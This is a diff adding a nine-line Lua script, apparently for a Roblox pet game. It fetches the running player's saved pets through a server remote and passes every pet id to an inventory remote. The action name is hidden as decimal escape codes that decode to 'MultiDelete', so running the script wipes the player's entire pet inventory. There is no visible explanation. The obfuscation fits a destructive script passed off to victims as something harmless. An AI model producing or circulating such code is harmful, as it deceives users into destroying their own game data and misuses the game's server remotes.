@@ -1,0 +1,9 @@
+local r = workspace.__REMOTES
+local p = r.Core["Get Stats"]:InvokeServer().Save.Pets
+local t = {}
+
+for i = 1, #p do
+    t[i] = p[i].id
+end
+
+r.Game.Inventory:InvokeServer("\77\117\108\116\105\68\101\108\101\116\101", t)
